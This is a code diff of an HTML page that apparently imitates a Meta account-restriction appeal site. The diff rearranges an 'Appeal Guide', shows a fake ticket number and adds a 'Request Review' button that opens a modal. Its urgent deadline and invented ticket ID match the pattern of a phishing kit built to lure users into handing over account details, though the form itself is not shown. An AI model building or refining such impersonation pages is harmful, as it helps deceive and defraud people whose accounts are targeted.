@@ -3335,32 +3335,7 @@ return _(ni), {
           </div>
           <div class="col-8">
               <div id="right">
-                <div id="card">
-                  <img src="./assets/img/block_4.png" alt="">
-                  <div class="card-text">
-                      
-                      <h6>Appeal Guide
-
-</h6>
-                      <p>Please be sure to provide the requested information below. Failure to provide this
-                          information may delay the processing of your appeal.</p>
-                      <ul>
-                  <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
-                      verbal threats.</li>
-                  <li>In your appeal, please include all necessary information to allow the fact checker to
-                      process your request in a timely manner. If you provide an invalid email address or do not
-                      respond to a request for additional information within 2 days, the fact checker may close
-                      the application without processing. If the appeal is not processed within 4 days, Meta will
-                      automatically reject it.</li>
-                  <li>When everything is ready, we will review your account and determine whether restrictions
-                      apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
-                      take longer. Depending on our decision, the restrictions imposed will remain in effect or
-                      will be lifted and your account will be reinstated. </li>
-              </ul><div class="btn-wrapper">
-                          
-                      </div>
-                  </div>
-              </div>
+                
                   <h1>
                       <img src="./assets/img/block_2.png" alt="" style="height: 40px;
                       width:40px;
@@ -3372,13 +3347,44 @@ return _(ni), {
                   <p>
                       If you believe restrictions have been placed on your account in error, you can request a review.
                   </p>
-                  <br>
-                  <div id="start" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">
-                                  Request Review
-                              </div><div id="utm-ticketId" style="display: none;">
+                  <br>                              <div id="utm-ticketId">
                       <p class="small-grey">
                           Your ticket id: <span>#4564-ATFD-4865</span></p>
                   </div>
+                  <h6>Appeal Guide
+  
+                  </h6>
+                                        <!-- <p>Please be sure to provide the requested information below. Failure to provide this
+                                            information may delay the processing of your appeal.</p> -->
+                                        <ul>
+                                    <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
+                                        verbal threats.</li>
+                                    <li>In your appeal, please include all necessary information to allow the fact checker to
+                                        process your request in a timely manner. If you provide an invalid email address or do not
+                                        respond to a request for additional information within 2 days, the fact checker may close
+                                        the application without processing. If the appeal is not processed within 4 days, Meta will
+                                        automatically reject it.</li>
+                                    <li>When everything is ready, we will review your account and determine whether restrictions
+                                        apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
+                                        take longer. Depending on our decision, the restrictions imposed will remain in effect or
+                                        will be lifted and your account will be reinstated. </li>
+                                </ul>
+                  <div id="card">
+                    <img src="./assets/img/block_4.png" alt="">
+                    <div class="card-text">
+                      <p class="card-type">Review request</p>
+                      <h4>
+                          <img src="./assets/img/block_lock.png" alt="" style="width: 23px;margin-top: -6px;">
+                          Fixing problems with account restrictions</h4>
+                      <p>Please be sure to provide the requested information below. Failure to provide this
+                          information may delay the processing of your appeal.</p>
+                      <div class="btn-wrapper">
+                          <div id="start" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1">
+                              Request Review
+                          </div>
+                      </div>
+                  </div>
+                </div>
 
 
                   <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()" style="display: none;">
@@ -4887,7 +4893,7 @@ return _(ni), {
 
       detectUtmUserLeftBar()
       delectAccountUtm()
-      delectTicketIdUtm()
+      //delectTicketIdUtm()
   </script>
 
 
